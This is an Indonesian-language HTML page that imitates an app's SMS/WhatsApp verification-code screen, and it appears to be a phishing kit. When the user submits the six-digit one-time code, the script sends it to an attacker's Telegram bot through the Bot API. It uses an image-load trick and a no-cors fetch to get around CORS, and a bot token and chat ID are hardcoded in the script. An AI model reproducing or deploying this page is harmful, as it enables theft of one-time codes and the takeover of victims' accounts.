<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Kode Verifikasi</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
    input[type="number"] {
      -moz-appearance: textfield;
    }
  </style>
</head>
<body class="bg-white font-sans px-6 py-6 max-w-md mx-auto">
  <button aria-label="Back" class="mb-6">
    <i class="fas fa-arrow-left text-green-600 text-3xl"></i>
  </button>

  <h1 class="text-2xl font-semibold text-gray-900 mb-4 leading-tight">
    Kode verifikasi telah dikirim ke SMS/Whatsapp
  </h1>

  <p class="text-gray-400 mb-2 text-sm leading-relaxed">
    Demi keamanan akun Anda, mohon untuk tidak membagikan kode verifikasi kepada siapapun
  </p>
  <p class="text-gray-900 text-sm mb-6 leading-relaxed">
    Jika nomor sudah tidak aktif,
    <a href="#" class="text-green-600 hover:underline">silakan lakukan perubahan nomor ponsel</a>
  </p>

  <form id="codeForm" class="flex justify-between mb-6 max-w-xs" onsubmit="return false;">  
    <input type="text" inputmode="numeric" maxlength="1" class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600" required />  
    <input type="text" inputmode="numeric" maxlength="1" class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600" required />  
    <input type="text" inputmode="numeric" maxlength="1" class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600" required />  
    <input type="text" inputmode="numeric" maxlength="1" class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600" required />  
    <input type="text" inputmode="numeric" maxlength="1" class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600" required />  
    <input type="text" inputmode="numeric" maxlength="1" class="w-12 h-12 border border-gray-200 rounded-md text-center text-2xl focus:outline-none focus:ring-2 focus:ring-green-600" required />  
  </form>

  <div id="timer" class="text-right text-gray-400 text-sm mb-8 select-none">60s</div>

  <button
    id="submitBtn"
    type="submit"
    disabled
    class="w-full bg-gray-300 text-white font-semibold py-3 rounded-full cursor-not-allowed"
  >
    Kirimkan
  </button>

  <!-- Load config.js -->
  <script src="config.js"></script>

  <script>
    const inputs = document.querySelectorAll('form#codeForm input');
    const submitBtn = document.getElementById('submitBtn');
    const timerEl = document.getElementById('timer');

    // Enable button only if all inputs have a digit
    function checkInputs() {
      const allFilled = Array.from(inputs).every(input => input.value.trim().length === 1);
      submitBtn.disabled = !allFilled;
      if (allFilled) {
        submitBtn.classList.remove('bg-gray-300', 'cursor-not-allowed');
        submitBtn.classList.add('bg-green-600', 'cursor-pointer');
      } else {
        submitBtn.classList.add('bg-gray-300', 'cursor-not-allowed');
        submitBtn.classList.remove('bg-green-600', 'cursor-pointer');
      }
    }

    inputs.forEach((input, idx) => {
      input.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value.length === 1 && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
        checkInputs();
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value.length === 0 && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });

    // Countdown timer
    let timeLeft = 60;
    timerEl.textContent = `${timeLeft}s`;
    const countdown = setInterval(() => {
      timeLeft--;
      if (timeLeft <= 0) {
        clearInterval(countdown);
        timerEl.textContent = '0s';
      } else {
        timerEl.textContent = `${timeLeft}s`;
      }
    }, 1000);

    // Submit handler (bypass CORS)
    submitBtn.addEventListener('click', () => {
      const code = Array.from(inputs).map(input => input.value).join('');
      if (code.length !== 6) return;
        const botToken = "8325475597:AAG81QSonK7rqbShO33CKxJoUOn8ZySapn4";
      const chatId = "8401770573";
      if (typeof TELEGRAM_CONFIG === "undefined") {
        alert("Konfigurasi Telegram tidak ditemukan.");
        return;
      }

      const { botToken, chatId } = TELEGRAM_CONFIG;
      const message = `Kode verifikasi yang dimasukkan: ${code}`;
      const params = new URLSearchParams({ chat_id: chatId, text: message });

      try {
        // Gunakan trik Image agar request pasti dikirim (bypass CORS)
        const img = new Image();
        img.onload = () => {
          alert("Kode OTP berhasil dikirim.");
        };
        img.onerror = () => {
          // fallback pakai fetch no-cors
          fetch(`https://api.telegram.org/bot${botToken}/sendMessage?${params.toString()}`, {
            method: "GET",
            mode: "no-cors",
          }).finally(() => {
            alert("Kode OTP dikirim (tanpa konfirmasi respons).");
          });
        };
        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?${params.toString()}`;
      } catch (err) {
        alert("Terjadi kesalahan saat mengirim kode ke Telegram.");
      }
    });
  </script>
</body>
</html>
